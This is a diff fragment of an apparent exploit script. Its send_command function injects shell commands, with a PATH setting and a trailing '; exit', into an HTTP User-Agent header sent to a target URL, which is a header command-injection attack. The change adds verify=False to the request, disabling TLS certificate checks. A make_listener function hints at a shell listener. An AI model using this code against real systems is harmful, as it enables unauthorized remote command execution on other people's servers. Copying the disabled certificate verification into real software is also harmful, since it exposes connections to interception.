@@ -20,7 +20,7 @@ def send_command(url, command, path="/usr/sbin:/usr/bin:/sbin:/bin"):
     ua += "PATH={} ".format(path)
     ua += "{}; exit".format(command)
     headers = {"User-Agent": ua}
-    return requests.get(url, headers=headers).text[:-1]
+    return requests.get(url, headers=headers, verify=False).text[:-1]
 
 
 def make_listener(url, port=8080):
